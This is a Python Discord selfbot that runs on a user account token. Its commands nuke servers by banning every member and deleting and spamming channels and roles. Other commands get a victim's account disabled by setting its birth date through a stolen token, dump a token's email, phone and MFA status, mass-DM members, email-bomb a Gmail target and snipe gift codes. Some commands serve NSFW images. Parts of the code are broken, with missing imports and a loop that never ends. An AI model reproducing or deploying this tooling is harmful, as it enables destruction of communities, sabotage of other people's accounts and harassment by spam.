class SELFBOT():
    __version__ = 1.5

import asyncio
import datetime
import functools
import io
import json
import os
import random
import string
import urllib.parse
import urllib.request
import time
import itertools
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import sys
import colorama
import threading
import discord
import ctypes
import numpy
import requests
from os import system
from PIL import Image
from colorama import Fore
from discord import Permissions
from discord.ext import commands
from discord.utils import get
from gtts import gTTS

ctypes.windll.kernel32.SetConsoleTitleW(f'[Ezo Selfbot v{SELFBOT.__version__}] | Loading...')

	  
with open('config.json') as f:
	 config = json.load(f)
	 

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
nitro_sniper = config.get('nitro_sniper')
slotbot_sniper = config.get('slotbot_sniper')

stream_url = "https://www.twitch.tv/ezodakilla"
tts_language = config.get('tts_language')

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

colorama.init()
ezo = discord.Client()
ezo = commands.Bot(command_prefix=prefix, self_bot=True)
ezo.remove_command('help')

ezo.giveaway_sniper = True
ezo.slotbot_sniper = True
ezo.copycat = None
ezo.remove_command('help') 

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    print(f'''{Fore.RED} 
                    
*                        *   *                         ______ __________   __          __                 *       *
                                                      |  ____|___  / __ \  \ \        / /
                                                      | |__     / / |  | |  \ \  /\  / /
                                                      |  __|   / /| |  | |   \ \/  \/ /
                                                      |____ / /__ |__| | |    \  /\  /
                                                      |______/_____\____/      \/  \/  *
                              *   **                   *                *

                                     **          *


                            {Fore.RED}Cold Selfbot v{SELFBOT.__version__} | {Fore.RED}Client Username:{ezo.user.name}#{ezo.user.discriminator}
                            {Fore.RED}Client ID:{ezo.user.id} | {Fore.RED}Slotbot Sniper:{slotbot_sniper}
                            {Fore.RED}Nitro Sniper:{nitro_sniper} | {Fore.RED}Client Prefix:{ezo.command_prefix}
                            {Fore.RED}Giveaway Sniper:{giveaway_sniper}
                            {Fore.RED}ezo really love yall niggas updates coming but hmu ezo#2021

       

    '''+Fore.RESET)

def Clear():
    os.system('cls')


Clear()

def Init():
    token = config.get('token')
    try:
        ezo.run(token, bot=False, reconnect=True)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.Blue}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "Ezo Loves Yall <3"

@ezo.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        await ctx.send(f'[ERROR]: {error_str}', delete_after=3)

@ezo.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"
  
    
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Cold Selfbot v{SELFBOT.__version__}] | Client User:{ezo.user.name}#{ezo.user.discriminator}')

@ezo.event
async def on_message_edit(before, after):
    await ezo.process_commands(after)

@ezo.event
async def on_message(message):
    if ezo.copycat is not None and ezo.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} [+] CHANNEL: {Fore.RED}[{message.channel}]"
            f"\n{Fore.WHITE} [+] SERVER: {Fore.RED}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} [+] CHANNEL: {Fore.RED}[{message.channel}]"
            f"\n{Fore.WHITE} [+] SERVER: {Fore.RED}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"\n{Fore.WHITE} [+] CHANNEL: {Fore.RED}[{message.channel}]"
            f"\n{Fore.WHITE} [+] SERVER: {Fore.RED}[{message.guild}]"
            f"\n{Fore.WHITE} [+] AUTHOR: {Fore.RED}[{message.author}]"
            f"\n{Fore.WHITE} [+] ELAPSED: {Fore.RED}[{elapsed}]"
            f"\n{Fore.WHITE} [+] CODE: {Fore.RED}{code}"
            + Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Sniped & Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if ezo.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if ezo.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{ezo.user.id}>' in message.content:
        if ezo.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    await ezo.process_commands(message)

@ezo.command()
async def wizz(ctx):
    await ctx.message.delete()
    await ctx.send("Nuking EZO W...")
    show_avatar = discord.Embed(
        
        color= ctx.author.color
    )
    show_avatar.set_image(url='https://media.discordapp.net/attachments/676163687869841418/799136057757138975/image0.gif?width=427&height=427')

    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f'Spam channel deleting proccession has been complete.')         
    for i in range(1, 25):
              await ctx.guild.create_text_channel(name=f'ezoW get nuked skid {i}')
              await ctx.guild.create_voice_channel(name=f'ezoW get nuked skid {i}')
              await ctx.guild.create_category(name=f'51 Dead Discordians {i}')
              print(f'{Fore.RED}[+] Finished Creating Channels <3')
              print('Completed')
              
@ezo.command(pass_context=True)
async def help(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=0xf2c703, timestamp=ctx.message.created_at)

 embed.set_author(name="🍾|𝐄𝐙𝐎 𝐒𝐄𝐋𝐅𝐁𝐎𝐓", icon_url=ctx.author.avatar_url)
 embed.set_image(url="https://media.discordapp.net/attachments/676163687869841418/799136057757138975/image0.gif?width=427&height=427")

 embed.add_field(name="`nsfw`", value="`lesbian, blowjob, tits, boobs, hentai, anal`", inline=False)
 embed.add_field(name="`nuke`", value="`wizz, massban, kickall, setgpfp, dmall, disable, tokeninfo, massr, massc, delr, delc, renameg, gmailbomb`", inline=False)
 embed.add_field(name="`fun`", value="`slot, 8ball, dick, kiss, hug, slap, tts, purge, clear, dog, tweet, feed, ascii`", inline=False)
 embed.add_field(name="`account`", value="`stream, listen, play, watch, stopactivity, prefix, ping, av, stealav, whois, setpfp, spam, serverav, uptime`", inline=False)

 await ctx.send(embed=embed)
 embed = discord.Embed(color=0xf2c703, timestamp=ctx.message.created_at)

@ezo.command()
async def disable(ctx, _token):
    await ctx.message.delete()
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': _token}, json={'date_of_birth': '2017-7-16'})
    if r.status_code == 400:
       await ctx.send(f"`Account disabled. LMAO F`")
       print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
    else:
       await ctx.send(f"`Invalid token g`")
       print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')

@ezo.command()
async def dog(ctx): 
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))    

@ezo.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

@ezo.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}")) 

@ezo.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    em.add_field(name="`ezo <3`", value="We See You Using this sb cuh (;", inline=True)
    return await ctx.send(embed=em)

@ezo.command(aliases=['pfpget', 'stealpfp'])
async def stealav(ctx, user: discord.Member):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.RED}Put yo password in config.json file fam"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await ezo.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.RED}{e}"+Fore.RESET)

@ezo.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.RED}Put yo password in config.json file fam"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await ezo.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.RED}{e}"+Fore.RESET)

@ezo.command()
async def dick(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Penis Size", description=f"8{dong}D", colour=0x0000)
    em.add_field(name="`ezo <3`", value="i see u using this sb cuh (;", inline=True)
    await ctx.send(embed=em)

@ezo.command()
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.RED}This token aint working fam"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [Click 4 pfp](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)
    
@ezo.command()
async def dmall(ctx, *, message):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(10)    
            await user.send(message)
        except:
            pass

@ezo.command()
async def massban(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@ezo.command()
async def kickall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@ezo.command()
async def massr(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    

@ezo.command()
async def massc(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=RandString())
        except:
            return

@ezo.command()
async def delc(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@ezo.command() 
async def delr(ctx): 
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@ezo.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@ezo.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance',
      'Bro idk stop asking'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)

@ezo.command()
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))

@ezo.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@ezo.command()
async def serverav(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@ezo.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()   
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@ezo.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@ezo.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def tits(ctx): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def lesbian(ctx): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()  
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@ezo.command()
async def uptime(ctx):
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@ezo.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == ezo.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@ezo.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await ezo.change_presence(activity=stream)    

@ezo.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await ezo.change_presence(activity=game)

@ezo.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await ezo.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@ezo.command()
async def watch(ctx, *, message):
    await ctx.message.delete()
    await ezo.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@ezo.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())

@ezo.command()
async def renameg(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)

@ezo.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    ezo.command_prefix = str(prefix)

@ezo.command()
async def setgpfp(ctx, url: str):
    await ctx.message.delete
    """Set the guild icon."""
    if ctx.message.guild is None:
        return

    permissions = ctx.message.author.permissions_in(ctx.channel)
    if not permissions.administrator:
        print("User Is NOT Admin")
        return

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                return await ctx.send('Could not download file...')
            data = io.BytesIO(await resp.read())
            await ctx.message.guild.edit(icon=data.read())
            await ctx.send("Icon set")

@ezo.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@ezo.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)
	    
def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'
	    
def GenAddress(addy: str):
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    four_char = ''.join(random.choice(letters) for _ in range(4))
    should_abbreviate = random.randint(0,1)
    if should_abbreviate == 0:
        if "street" in addy.lower():
            addy = addy.replace("Street", "St.")
            addy = addy.replace("street", "St.")
        elif "st." in addy.lower():
            addy = addy.replace("st.", "Street")
            addy = addy.replace("St.", "Street")
        if "court" in addy.lower():
            addy = addy.replace("court", "Ct.")
            addy = addy.replace("Court", "Ct.")
        elif "ct." in addy.lower():
            addy = addy.replace("ct.", "Court")
            addy = addy.replace("Ct.", "Court")
        if "rd." in addy.lower():
            addy = addy.replace("rd.", "Road")
            addy = addy.replace("Rd.", "Road")
        elif "road" in addy.lower():
            addy = addy.replace("road", "Rd.")
            addy = addy.replace("Road", "Rd.")
        if "dr." in addy.lower():
            addy = addy.replace("dr.", "Drive")
            addy = addy.replace("Dr.", "Drive")
        elif "drive" in addy.lower():
            addy = addy.replace("drive", "Dr.")
            addy = addy.replace("Drive", "Dr.")
        if "ln." in addy.lower():
            addy = addy.replace("ln.", "Lane")
            addy = addy.replace("Ln.", "Lane")
        elif "lane" in addy.lower():
            addy = addy.replace("lane", "Ln.")
            addy = addy.replace("lane", "Ln.")
    random_number = random.randint(1,99)
    extra_list = ["Apartment", "Unit", "Room"]
    random_extra = random.choice(extra_list)
    return four_char + " " + addy + " " + random_extra + " " + str(random_number)
	      
def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass
	    
ezo.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")
	    
def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))	    
	    
#End

if __name__ == '__main__':
	Init()
